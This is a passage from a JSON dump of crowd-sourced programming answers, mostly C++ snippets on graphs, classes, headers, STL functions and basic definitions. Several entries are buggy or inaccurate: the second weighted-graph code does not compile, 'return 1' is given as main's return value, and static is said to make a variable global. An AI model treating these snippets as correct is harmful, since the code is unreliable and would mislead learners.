    "description": "#include <bits/stdc++.h> using namespace std; class nodes{ \tpublic:  \t\tpair<int,int> p; \t\tint first; \t\tint second; \t\tstring s; }; string makestring(int a,int b){ \tstd::stringstream out1; \tstd::stringstream out2; \tstring t1,t2,str;     out1 << a;     t1 = out1.str();     out2 << b;     t2 = out2.str();     str = \"(\"+t1+\",\"+t2+\")\";     return str; } int main() { \tint counter = 0;     ios::sync_with_stdio(false);     //pair<int,int> cap,ini,final;     nodes cap,ini,final;     ini.p.first=0,ini.p.second=0;     ini.s = makestring(ini.p.first,ini.p.second);     //Input initial values     cout<<\"Enter the capacity of 2 jugs\\n\";     cin>>cap.p.first>>cap.p.second;     //input final values     cout<<\"Enter the required jug config\\n\";     cin>>final.p.first>>final.p.second;     //Using BFS to find the answer     queue<nodes> q;     q.push(ini);     nodes jug;     while(!q.empty()){     \t//Base case     \tjug = q.front();     \tif(jug.p.first == final.p.first){// && jug.p.second == final.p.second){     \t\tcout<<jug.s<<endl;     \t\t// counter++;     \t\t// if(counter==5) \t  \t\treturn 0;     \t}     \tnodes temp = jug;     \t//Fill 1st Jug     \tif(jug.p.first<cap.p.first){ \t\t\ttemp.p = make_pair(cap.p.first,jug.p.second); \t\t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second); \t\t\tq.push(temp);     \t}     \t//Fill 2nd Jug     \tif(jug.p.second<cap.p.second){ \t\t\ttemp.p = make_pair(jug.p.first,cap.p.second); \t\t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second); \t\t\tq.push(temp);     \t}     \t//Empty 1st Jug     \tif(jug.p.first>0){ \t\t\ttemp.p = make_pair(0,jug.p.second); \t\t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second); \t\t\tq.push(temp);     \t}     \t//Empty 2nd Jug     \tif(jug.p.second>0){ \t\t\ttemp.p = make_pair(jug.p.first,0); \t\t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second); \t\t\tq.push(temp);     \t}     \t//Pour from 1st jug to 2nd until its full     \tif(jug.p.first>0 && (jug.p.first+jug.p.second)>=cap.p.second){     \t\ttemp.p = make_pair((jug.p.first-(cap.p.second-jug.p.second)),cap.p.second);     \t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second);     \t\tq.push(temp);     \t}     \t//Pour from 2nd jug to 1st until its full     \tif(jug.p.second>0 && (jug.p.first+jug.p.second)>=cap.p.first){     \t\ttemp.p = make_pair(cap.p.first,(jug.p.second-(cap.p.first-jug.p.first)));     \t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second);     \t\tq.push(temp);     \t}     \t//Pour all water from 1st to 2nd     \tif(jug.p.first>0 && (jug.p.first+jug.p.second)<=cap.p.second){     \t\ttemp.p = make_pair(0,jug.p.first+jug.p.second);     \t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second);     \t\tq.push(temp);     \t}     \t//Pour from 2nd jug to 1st until its full     \tif(jug.p.second>0 && (jug.p.first+jug.p.second)<=cap.p.first){     \t\ttemp.p = make_pair(jug.p.first+jug.p.second,0);     \t\ttemp.s = jug.s + makestring(temp.p.first,temp.p.second);     \t\tq.push(temp);     \t}     \tq.pop();     } \treturn 0; }\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4211,
    "keyword": null,
    "link": null,
    "title": " wattpad",
    "description": "get the gosh darn diggly doo out of here before its too late\nDon't you have codes to write? Go do them before you get sucked!!!\nWhat the hell is going on?\nUh hi wattpad is often used by young people to share their custom stories on the web,  and you could probably code something like this with like java or html.  (Are HTML books a thing??)  Start your own book via HTML!  <!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Book Cover</title> </head>  <body>     <header>         <h1>Book Title</h1>         <nav class=\"navbar\">             <p>takes you to table of contents, glossary, etc</p>         </nav>     </header>     <Main>      </Main>     <Footer>         <p>Template by James V of BLOX Virtual Studio</p>         <p>Anyone can adapt this code freely, but should let people know</p>         <p>da hecc they got their code from</p>         <p></p>         <p>v0.1 BLOX Virtual Book, virtual office 256</p>         <p>@2020 James V and BLOX Virtual Studio</p>     </Footer> </body>  </html>\nIt's too late for me\nWhatever you do, don't listen to the goshdarn diggly man He is evil\ni feel people use this like some sort of secret chat \nyou know im gonna stay a virgin cause i use this to make anime fan fics lol\nCHECK OUT PASSERINE IT IS THE MOST LEGENDARY FANFICTION EVER  EVEN IF YOU DON'T KNOW ANYTHING ABOUT IT YOU WILL CRY 1000%\nare you ok?\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4212,
    "keyword": null,
    "link": null,
    "title": " weak",
    "description": "class RefBase { public : \t void             incStrong ( const  void * id)  const ; \t void             decStrong ( const  void * id)  const ;  \tvoid             forceIncStrong ( const  void * id)  const ;  \t//! DEBUGGING ONLY: Get current strong ref count.  \tint32_t          getStrongCount ()  const ;  \tclass weakref_type \t{ \tpublic : \t\tRefBase* refBase() const ;  \t\tvoid                 incWeak ( const  void * id) ; \t\t void                 decWeak ( const  void * id) ;  \t\tbool                 attemptIncStrong ( const  void * id) ;  \t\t//! This is only safe if you have set OBJECT_LIFETIME_FOREVER.  \t\tbool                 attemptIncWeak ( const  void * id) ;  \t\t//! DEBUGGING ONLY: Get current weak ref count.  \t\tint32_t              getWeakCount ()  const ;  \t\t//! DEBUGGING ONLY: Print references held on object.  \t\tvoid                 printRefs ()  const ;  \t\t//! DEBUGGING ONLY: Enable tracking for this object.  \t\t// enable - enable/disable tracking  \t\t// retain - when tracking is enable, if true, then we save a stack trace  \t\t// for each reference and dereference; when retain == false, we  \t\t// match up references and dereferences and keep only the  \t\t// outstanding ones.  \t\tvoid                 trackMe ( bool enable, bool retain) ; \t};  \tweakref_type* createWeak( const  void * id) const ;  \tweakref_type* getWeakRefs() const ;  \t//! DEBUGGING ONLY: Print references held on object.  \tinline   void             printRefs ()  const  {getWeakRefs()->printRefs();}  \t//! DEBUGGING ONLY: Enable tracking of object.  \tinline   void             trackMe ( bool enable, bool retain) \t { \t\tgetWeakRefs()->trackMe(enable, retain); \t}  protected : \tRefBase(); \tvirtual                  ~RefBase();  \t//! Flags for extendObjectLifetime()  \tenum { \t\tOBJECT_LIFETIME_WEAK = 0x0001 , \t\tOBJECT_LIFETIME_FOREVER = 0x0003 \t};  \tvoid             extendObjectLifetime ( int32_t mode) ;  \t//! Flags for onIncStrongAttempted()  \tenum { \t\tFIRST_INC_STRONG = 0x0001 \t};  \tvirtual  void             onFirstRef () ; \t virtual  void             onLastStrongRef ( const  void * id) ; \t virtual  bool             onIncStrongAttempted ( uint32_t flags, const  void * id) ; \t virtual  void             onLastWeakRef ( const  void * id) ;  private : \t friend  class weakref_type; \t class weakref_impl;  \tRefBase( const RefBase& o); \tRefBase&         operator =( const RefBase& o);  \tweakref_impl* const mRefs; };\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4213,
    "keyword": null,
    "link": null,
    "title": " web scraping with cpp",
    "description": "#include <webdriverxx/webdriverxx.h> using namespace webdriverxx;  int main() {    WebDriver firefox = Start(Firefox());    firefox        .Navigate(\"http://google.com\")        .FindElement(ByClass(\"class_name\"))        .SendKeys(\"Hello, world!\")        .Submit();    return 0;     } \n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4214,
    "keyword": null,
    "link": null,
    "title": " weighted graph c++",
    "description": "#include <iostream> using namespace std;  struct adjNode {     int val, cost;     adjNode* next; };  struct graphEdge {     int start_ver, end_ver, weight; }; class DiaGraph{         adjNode* getAdjListNode(int value, int weight, adjNode* head)   {         adjNode* newNode = new adjNode;         newNode->val = value;         newNode->cost = weight;                   newNode->next = head;          return newNode;     }     int N;   public:     adjNode **head;                DiaGraph(graphEdge edges[], int n, int N)  {               head = new adjNode*[N]();         this->N = N;                 for (int i = 0; i < N; ++i)             head[i] = nullptr;                for (unsigned i = 0; i < n; i++)  {             int start_ver = edges[i].start_ver;             int end_ver = edges[i].end_ver;             int weight = edges[i].weight;                     adjNode* newNode = getAdjListNode(end_ver, weight, head[start_ver]);                                              head[start_ver] = newNode;              }     }          ~DiaGraph() {     for (int i = 0; i < N; i++)         delete[] head[i];         delete[] head;      } };  void display_AdjList(adjNode* ptr, int i) {     while (ptr != nullptr) {         cout << \"(\" << i << \", \" << ptr->val             << \", \" << ptr->cost << \") \";         ptr = ptr->next;     }     cout << endl; }  int main() {          graphEdge edges[] = {                {0,1,2},{0,2,4},{1,4,3},{2,3,2},{3,1,4},{4,3,3}     };     int N = 6;           int n = sizeof(edges)/sizeof(edges[0]);         DiaGraph diagraph(edges, n, N);        cout<<\"Graph adjacency list \"<<endl<<\"(start_vertex, end_vertex, weight):\"<<endl;     for (int i = 0; i < N; i++)     {                  display_AdjList(diagraph.head[i], i);     }     return 0; }\n//code  by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/  #include <bits/stdc++.h> using namespace std;  //undirected weighted graph and all functions class WeightedGraph {   vector< pair<int,int> >*adjacency_list;   int vertices;   public:   WeightedGraph(int n)   {     vertices=n;     adjacency_list=new vector< pair<int,int> >[n];   }   void add_edge(int v1,int v2,int wt);   void dfsHelper(int src,bool visited[]);   void dfs(int src);   void bfs(int src);   int minDistance(vector<int>dist,bool visited[]);     void djisktra(int src);   void display_graph(); };  int main() {   //graph of five vertices   WeightedGraph wg1(5);   //adding edges   wg1.add_edge(0,1,10);   wg1.add_edge(1,2,20);   wg1.add_edge(2,3,30);   wg1.add_edge(1,3,40);   wg1.add_edge(2,4,100);   wg1.add_edge(4,0,10);   //displaying the graph   wg1.display_graph();   //dfs from vertex 0   wg1.dfs(0);   //bfs from vertex 0   wg1.bfs(0);   //djikstra   for(int i=0;i<5;i++)   {     djikstra(i);   }   return 0; } //function definitions  void WeightedGraph::add_edge(int v1,int v2,int wt) {   /*push the other vertex into the adjacency list of the given vertex   and vice versa. If it would have been a directed graph,   only the first line would be enough   */   adjacency_list[v1].push_back(make_pair(v2,wt));   adjacency_list[v2].push_back(make_pair(v1,wt)); }  void WeightedGraph::dfsHelper(int src,bool visited[]) {   visited[src]=true;   cout<<src<<\" \";   for(vector<int>::iterator it=adjacency_list.begin();i!=adjacency_list.end();it++)   {     if(!visited[it->first]);       dfsHelper(it->first,visited);   } } void WeightedGraph::dfs(int src) {   bool visited[vertices];   for(int i=0;i<vertices;i++)     visited[i]=false;   dfsHelper(src,visited); } void WeightedGraph::bfs(int src) {   bool visited[vertices];   for(int i=0;i<vertices;i++)     visited[i]=false;   cout<<src<<\" \";   visited[src]=true;   queue<int>helper;   helper.push(src);   while(!helper.empty())   {     src=helper.front();     for(vector<int>::iterator it=adjacency_list[src].begin();it!+adjacency_list[src].end();it++)     {       if(!visited[it->first])       {         visited[it->first]=true;         cout<<it->first<<\" \";         helper.push(it->first);       }     }     helper.pop();   } }  int WeightedGraph::minDistance(vector<int>dist,bool visited[])   {     int min=INT_MAX;     int minIndex=INT_MAX;     for(int i=0;i<N;i++)     {       if(!visited[i]&&dist[i]<=min)       {         min=dist[i];         minIndex=i;       }     }     return minIndex;   }   void WeightedGraph::djikstra(int src)   {     vector<int>dist;     bool visited[vertices];     for(int i=0;i<vertices;i++)     {       dist.push_back(INT_MAX);       visited[i]=false;     }     visited[src]=true;     dist[src]=0;     for(int i=0;i<vertices-1;i++)     {       int k=minDistance(dist,visited);       visited[k]=true;       for(int j=0;j<vertices;j++)       {         if(!visited[i]&&dist[i]!=INT_MAX&&adjacency_list[i][j].second+dist[i]<dist[j])         {           dist[j]=adjacency_list[i][j].second+dist[i];         }       }     }     for(int i=0;i<dist.size();i++)       cout<<dist[i]<<\" \";          cout<<endl;   } void WeightedGraph::display_graph() {   int a,b;   //first loop to traverse across vertices   for(int i=0;i<vertices;i++)   {       cout<<\"Adjacency list of vertex \"<<i<<endl;     //second loop to traverse across the adjacency list of some vertex i     for(auto it=adjacency_list[i].begin();it!=adjacency_list[i].end();it++)     {       //set a as the vertex number and b as the weight       a=it->first;       b=it->second;       cout<<\"Vertex : \"<<a<<\" Weight : \"<<b<<endl;     }     cout<<endl;   } }  //thank you! \n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4215,
    "keyword": null,
    "link": null,
    "title": " wgat is duble in c++",
    "description": "C++ double is a versatile data type that is used internally for the compiler to define and hold any numerically valued data type especially any decimal oriented value. C++ double data type can be either fractional as well as whole numbers with values.\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4216,
    "keyword": null,
    "link": null,
    "title": " what algorithm does bitcoin use",
    "description": "SHA-256 hashing algorithm  Quite Secure\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4217,
    "keyword": null,
    "link": null,
    "title": " what are access specifiers in c++",
    "description": "class MyClass {  // The class   public:        // Access specifier     // class members goes here };  The public keyword is an access specifier.  Access specifiers define how the members (attributes and methods) of a  class can be accessed.  In the example above, the members are public - which means that they  can be accessed and modified from outside the code.  However,  what if we want members to be private and hidden from the outside world?  In C++, there are three access specifiers:  public - members are accessible from outside the class private - members cannot be accessed (or viewed) from outside the class protected - members cannot be accessed from outside the class,  however, they can be accessed in inherited classes.  \n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4218,
    "keyword": null,
    "link": null,
    "title": " what are constructors and destructors c++",
    "description": "class A {     // constructor     A()     {         cout << \"Constructor called\";     }      // destructor     ~A()     {         cout << \"Destructor called\";     } };  int main() {     A obj1;   // Constructor Called     int x = 1     if(x)     {         A obj2;  // Constructor Called     }   // Destructor Called for obj2 } //  Destructor called for obj1 \n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4219,
    "keyword": null,
    "link": null,
    "title": " what are manipulators in c++",
    "description": "boolalpha (cout);\ncout << boolalpha;\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4220,
    "keyword": null,
    "link": null,
    "title": " what are parameters in c++",
    "description": "#include <iostream> #include <cstdarg> using namespace std;  double average(int num,...) {    va_list valist;               // A place to store the list of arguments (valist)    double sum = 0.0;    int i;        va_start(valist, num);        // Initialize valist for num number of arguments    for (i = 0; i < num; i++) {   // Access all the arguments assigned to valist       sum += va_arg(valist, int);    }    va_end(valist);               // Clean memory reserved for valist        return sum/num; }  int main() {    cout << \"[Average 3 numbers: 44,55,66] -> \" << average(3, 44,55,66) << endl;    cout << \"[Average 2 numbers: 10,11] -> \" << average(2, 10,11) << endl;     cout << \"[Average 1 number:  18] -> \" << average(1, 18) << endl;  }  /* NOTE: You will need to use the following 'data_types' within the function va_list   :  A place to store the list of arguments (valist) va_start  :  Initialize valist for num number of arguments va_arg    :  Access all the arguments assigned to valist va_end    :  Clean memory reserved for valist */\n#include <iostream>  // Define name_x_times() below: void name_x_times(std::string name, int x){ while(0 < x){   std::cout << name << \"\" } }  int main() {      std::string my_name = \"Add your name here!\";   int some_number = 5; // Change this if you like!   // Call name_x_times() below with my_name and some_number       } // this put shit inside of the shit, look back at your adventure.cpp code future me.\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4221,
    "keyword": null,
    "link": null,
    "title": " what are singleton classes c++",
    "description": "#include <iostream>  using namespace std;  class Singleton {    static Singleton *instance;    int data;      // Private constructor so that no objects can be created.    Singleton() {       data = 0;    }     public:    static Singleton *getInstance() {       if (!instance)       instance = new Singleton;       return instance;    }     int getData() {       return this -> data;    }     void setData(int data) {       this -> data = data;    } };  //Initialize pointer to zero so that it can be initialized in first call to getInstance Singleton *Singleton::instance = 0;  int main(){    Singleton *s = s->getInstance();    cout << s->getData() << endl;    s->setData(100);    cout << s->getData() << endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4222,
    "keyword": null,
    "link": null,
    "title": " what are specialized classes c++",
    "description": "The act of creating a new definition of a function, class, or member of a class  from a template declaration and one or more template arguments   is called template instantiation.   The definition created from a template instantiation is called a specialization.\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4223,
    "keyword": null,
    "link": null,
    "title": " what c++ library is arccos in",
    "description": "// ARCCOS is built in to the C++ STL acos(value);\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4224,
    "keyword": null,
    "link": null,
    "title": " what did swap method return in c++",
    "description": "Return Value: The function does not return anything, it swaps the values of the two variables\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4225,
    "keyword": null,
    "link": null,
    "title": " what do I return in int main() function c++",
    "description": "int main() {   return 1; }\n",
    "reg_date": "2021-10-12T11:44:19.000Z"
  },
  {
    "id": 4226,
    "keyword": null,
    "link": null,
    "title": " what do you mean by smallest anagram of a string",
    "description": "#include<iostream> #include<algorithm>  using namespace std;  int main(){ string s,p; int t; cin>>t; while(t--){ int j=0,i=0; cin>>s>>p;   while (i<s.length())  {     if(p[j]==s[i]){     s.erase(s.begin()+i);     j++;     i=0;                 }   else   {     i++;   }         }    int k=-1; sort(s.begin(),s.end()); for (int i = 0; i < s.length(); i++) {   if(p[0]>=s[i])   k=i; } s.insert(k+1,p); cout<<s<<endl; } return 0; } \n#include<bits/stdc++.h> using namespace std; int main(){    int t;    cin>>t;    while(t--)    {        string s,p;        cin>>s;        cin>>p;         map<char,int> ms,mp;        for(int i=0;i<s.length();i++)          ms[s[i]]++;        for(int i=0;i<p.length();i++)          mp[p[i]]++;        for(auto it=mp.begin();it!=mp.end();it++)        {            ms[it->first]-=it->second;        }        string temp=\"\";        for(auto it=ms.begin();it!=ms.end();it++)        {            if(it->first!=p[0]){            while(ms[it->first]>0)            {                temp+=it->first;                ms[it->first]--;            }                        }            else            {                break;            }        }        if(p[0]<p[1]){        while(ms[p[0]]>0)          {            temp+=p[0];            ms[p[0]]--;          }        }        // cout<<temp;               temp+=p;        for(auto it=ms.begin();it!=ms.end();it++)        {            while(ms[it->first]>0){               temp+=it->first;               ms[it->first]--;}        }        cout<<temp<<endl;    } } \n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4227,
    "keyword": null,
    "link": null,
    "title": " what does copy if c++",
    "description": "//C++ STL program to demonstrate use of //std::copy_if() function #include <iostream> #include <algorithm> #include <vector> using namespace std;  int main() {     //declaring & initializing an int array     int arr[] = { 10, 20, 30, -10, -20, 40, 50 };     //vector declaration     vector<int> v1(7);      //copying 5 array elements to the vector     copy_if(arr, arr + 7, v1.begin(), [](int i) { return (i >= 0); });      //printing array     cout << \"arr: \";     for (int x : arr)         cout << x << \" \";     cout << endl;      //printing vector     cout << \"v1: \";     for (int x : v1)         cout << x << \" \";     cout << endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4228,
    "keyword": null,
    "link": null,
    "title": " what does map.count() return in c++",
    "description": "int n; cin>>n; long val; map<int,long> mp3; long long res=0; while(n--){ \tcin>>val; \tif(mp3.count(val)) \tres+=mp3[val];      //mp3.count(val) returns 1 if val is present in the map already or      //the number of times the key K is present in the map container.     if(mp2.count(val)) \tmp3[val*r]+=mp2[val]; \tmp2[val*r]++; } cout<<res<<endl;\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4229,
    "keyword": null,
    "link": null,
    "title": " what does npl mean?",
    "description": "cout << \"npl means nonperformin loan\" << endl;\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4230,
    "keyword": null,
    "link": null,
    "title": " what does static int do?",
    "description": "#include <iostream> using namespace std;  void fun() {   static int i = 10;\t\t//static makes it global throughout the program   i++;   cout << i; }  int main() {   fun();   fun();   fun();   return 0; }  ans: 111213\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4231,
    "keyword": null,
    "link": null,
    "title": " what does the modularity mean in c++",
    "description": "modularity means the written program can be splitted up in to modules by using classes and each class can be considered as a module.\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4232,
    "keyword": null,
    "link": null,
    "title": " what does tilde mean in c++",
    "description": "// ~ AKA a tilde is used to create destructors in classes.   class Entity{   public:    \t~Destructor();   \t//This is a destructor, which destroys instances and can free up memory. };  //Source for answer: // https://stackoverflow.com/questions/1395506/in-c-what-does-a-tilde-before-a-function-name-signify  //Other Sources: // https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_74/rzarg/cplr380.htm\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4233,
    "keyword": null,
    "link": null,
    "title": " what is \"\\0\" character in c++",
    "description": "this character in the c++ string means the end of the string\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4234,
    "keyword": null,
    "link": null,
    "title": " what is -> in c++",
    "description": "/**  * @author Charles Salvia (StackOverflow)  *  * -> is to access a member function or member variable of an object through  * a pointer, as opposed to a regular variable or reference.  */  // For example: with a regular variable or reference, you use the . operator // to access member functions or member variables.   std::string s = \"abc\"; std::cout << s.length() << std::endl;  //But if you're working with a pointer, you need to use the -> operator: std::string* s = new std::string(\"abc\"); std::cout << s->length() << std::endl;\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4235,
    "keyword": null,
    "link": null,
    "title": " what is a .cpp file",
    "description": "A .CPP file is a file that contains C++ code.\n",
    "reg_date": "2021-10-12T11:44:20.000Z"
  },
  {
    "id": 4236,
    "keyword": null,
    "link": null,
    "title": " what is a header in c++",
    "description": "// my_class.h #ifndef MY_CLASS_H // include guard #define MY_CLASS_H  namespace N {     class my_class     {     public:         void do_something();     }; }  #endif /* MY_CLASS_H */ \n// sample.h #pragma once #include <vector> // #include directive #include <string>  namespace N  // namespace declaration {     inline namespace P     {         //...     }      enum class colors : short { red, blue, purple, azure };      const double PI = 3.14;  // const and constexpr definitions     constexpr int MeaningOfLife{ 42 };     constexpr int get_meaning()     {         static_assert(MeaningOfLife == 42, \"unexpected!\"); // static_assert         return MeaningOfLife;     }     using vstr = std::vector<int>;  // type alias     extern double d; // extern variable  #define LOG   // macro definition  #ifdef LOG   // conditional compilation directive     void print_to_log(); #endif      class my_class   // regular class definition,     {                // but no non-inline function definitions          friend class other_class;     public:         void do_something();   // definition in my_class.cpp         inline void put_value(int i) { vals.push_back(i); } // inline OK      private:         vstr vals;         int i;     };      struct RGB     {         short r{ 0 };  // member initialization         short g{ 0 };         short b{ 0 };     };      template <typename T>  // template definition     class value_store     {     public:         value_store<T>() = default;         void write_value(T val)         {             //... function definition OK in template         }     private:         std::vector<T> vals;     };      template <typename T>  // template declaration     class value_widget; } \n// my_class.cpp #include \"my_class.h\" // header in local directory #include <iostream> // header in standard library  using namespace N; using namespace std;  void my_class::do_something() {     cout << \"Doing something!\" << endl; } \n// my_program.cpp #include \"my_class.h\"  using namespace N;  int main() {     my_class mc;     mc.do_something();     return 0; } \nint x; // declaration x = 42; // use x \n// my_class.h namespace N {     class my_class     {     public:         void do_something();     };  } \n",
    "reg_date": "2021-10-12T11:44:21.000Z"
  },
  {
    "id": 4237,
    "keyword": null,
    "link": null,
    "title": " what is a struct in c++",
    "description": " #include <bits/stdc++.h> #include <iostream>  #define ll long long  using namespace std;  struct student{ \tint roll; \tstring name; \tint age; \t \tvoid studentDetails(){ \t\tcout<<\"Name is \"<<name<<\" Age is \"<<age<<\" roll no is \"<<roll<<endl; \t} };   int main(){ \t \tstudent sumant; \tsumant.roll = 30; \tsumant.name = \"Sumant Tirkey\"; \tsumant.age = 18; \t \tsumant.studentDetails(); \tcout<<endl;      return 0; }\nstruct Person {     char name[50];     int age;     float salary; };\nstruct foo {   int bar;   foo() : bar(3) {}   //look, a constructor   int getBar()    {      return bar;    } };  foo f; int y = f.getBar(); // y is 3\n",
    "reg_date": "2021-10-12T11:44:22.000Z"
  },
  {
    "id": 4238,
    "keyword": null,
    "link": null,
    "title": " what is abstract class in c++",
    "description": "//Code by Soumyadeep Ghosh  //insta : @soumyadepp //linked in : https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/ #include <bits/stdc++.h>  using namespace std;  class person {   string p_id;   public:   virtual void get_info()=0; //declaring person as abstract class   virtual void show()=0; };  class student:public person {   string name;   int roll_no;   public:   /*overriding the pure virtual function declared in base class otherwise     this class will become an abstract one and then objects cannot be created     for the same*/     void get_info()     {       cout<<\"Enter name of the student \"<<endl;       cin>>name;       cout<<\"Enter roll number of the student \"<<endl;       cin>>roll_no;     }    void show()    {      cout<<\"Name : \"<<name<<\" Roll number: \"<<roll_no<<endl;    } };  int main() {   person *p;   p=new student;   p->get_info();   p->show();   return 0; } \nstruct Abstract {     virtual void f() = 0; // pure virtual }; // \"Abstract\" is abstract   struct Concrete : Abstract {     void f() override {} // non-pure virtual     virtual void g();     // non-pure virtual }; // \"Concrete\" is non-abstract   struct Abstract2 : Concrete {     void g() override = 0; // pure virtual overrider }; // \"Abstract2\" is abstract   int main() {     // Abstract a; // Error: abstract class     Concrete b; // OK     Abstract& a = b; // OK to reference abstract base     a.f(); // virtual dispatch to Concrete::f()     // Abstract2 a2; // Error: abstract class (final overrider of g() is pure) }\nstruct Abstract {      virtual ~Abstract() = 0; };  Abstract::~Abstract() {}  struct Valid: public Abstract {         // Notice you don't need to actually overide the base         // classes pure virtual method as it has a default };   int main() {     // Abstract        a;  // This line fails to compile as Abstract is abstract     Valid           v;  // This compiles fine. }\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4239,
    "keyword": null,
    "link": null,
    "title": " what is atoi in strinf",
    "description": "The C library function int atoi(const char *str) converts the  string argument str to an integer (type int).  Note: It is used in case of string because in strings a number is also stored as char  and we have to do Typecasting  form (string -> int)\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4240,
    "keyword": null,
    "link": null,
    "title": " what is blob in computer vision",
    "description": "In Image processing, blob detection refers to modules that are aimed at detecting points and/or regions in the image that differ in properties like brightness or color compared to the surrounding\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4241,
    "keyword": null,
    "link": null,
    "title": " what is c++",
    "description": "C++ is a cross-platform language that can be used to create high-performance applications.  C++ was developed by Bjarne Stroustrup, as an extension to the C language.  C++ gives programmers a high level of control over system resources and memory.\nC++ is a general-purpose programming language created by Bjarne  Stroustrup as an extension of the C programming language, or  \"C with Classes\".  //as you can also see to your right ---------------------->  C++ still qualifies as a high-level languge, yet the rise of  languages like Ruby and Java have given capabilities that sway people's opinion towards what is and is not \"high-level\".   Yet high-level simply means it's farther from machine code and closer  to human-readable form. Hence the need for a compiler/interpreter.  So don't get too worked up about granular specifics. \n#include <iostream>  int main() { \tstd::cout << \"Hello, world!\" << std::endl; \treturn 0; }\nC++ is a general-purpose programming language created by Bjarne Stroustrup as an extension of the C programming language, or \"C with Classes\".\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4242,
    "keyword": null,
    "link": null,
    "title": " what is c++ file extension",
    "description": "All C++ header extensions: .c , .h , .hpp , .hxx , .cpp , .hh C++ file (items / source code): .cpp , .cc , .cxx \n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4243,
    "keyword": null,
    "link": null,
    "title": " what is c++ function",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\n#include <iostream>  using namespace std;  void function(){     cout << \"I am a function!\" << endl; }  int main() {     function();      return 0; }\nreturn_type function_name( parameter list ) {    body of the function } \n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4244,
    "keyword": null,
    "link": null,
    "title": " what is c++ used for",
    "description": "# C++ IS USED FOR MAKING GAMES, PHOTOS AND VIDEO EDITING APPS \n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4245,
    "keyword": null,
    "link": null,
    "title": " what is difference between ciel and floor",
    "description": "Ceil (short for ceiling) and floor function are both mathematical  functions. ... For example, ceil function returns the least value  of the integer that is greater than or equal to the specified number. On the other hand, floor function gets the greatest value that is less than or equal to the specified number.\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4246,
    "keyword": null,
    "link": null,
    "title": " what is difference between single inverted and double inverted in programming languages",
    "description": "[...] In common usage, there may be a distinction between the single and double quotation marks in this context; often, single quotation marks are used to embrace single characters, while  double quotation marks enclose whole words or phrases[.]   Simply: according to the charcter check for string and char 1. if char , then use ''; 2. if string , then use \"\";\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4247,
    "keyword": null,
    "link": null,
    "title": " what is difffrence between s.length() and s.size()",
    "description": "The size() function is consistent with other STL containers  (like vector, map, etc.) and length() is consistent with most  peoples intuitive notion of character strings like a word, sentence or paragraph. We say a paragraph'ss length not its size, so length()  is to make things more readable.\n",
    "reg_date": "2021-10-12T11:44:23.000Z"
  },
  {
    "id": 4248,
    "keyword": null,
    "link": null,
    "title": " what is handling null terminated string in c++",
    "description": "#include<iostream> using namespace std; main() {    string my_string = \"This is a sample text\";    cout << my_string << endl;    my_string = \"This is a sam\\0ple text\"; //check the \\0    cout << my_string; } //Outputs /*This is a sample text This is a sam*/\n",
    "reg_date": "2021-10-12T11:44:24.000Z"
  },
  {
    "id": 4249,
    "keyword": null,
    "link": null,
    "title": " what is imposter syndrome",
    "description": "/* Imposter syndrome is loosely defined as doubting your abilities and feeling like a fraud. It disproportionately affects high-achieving people, who find it difficult to accept their accomplishments. Many question whether they're deserving of accolades.  notice how i wrote this comment in C++?  */  \n",
    "reg_date": "2021-10-12T11:44:24.000Z"
  },
  {
    "id": 4250,
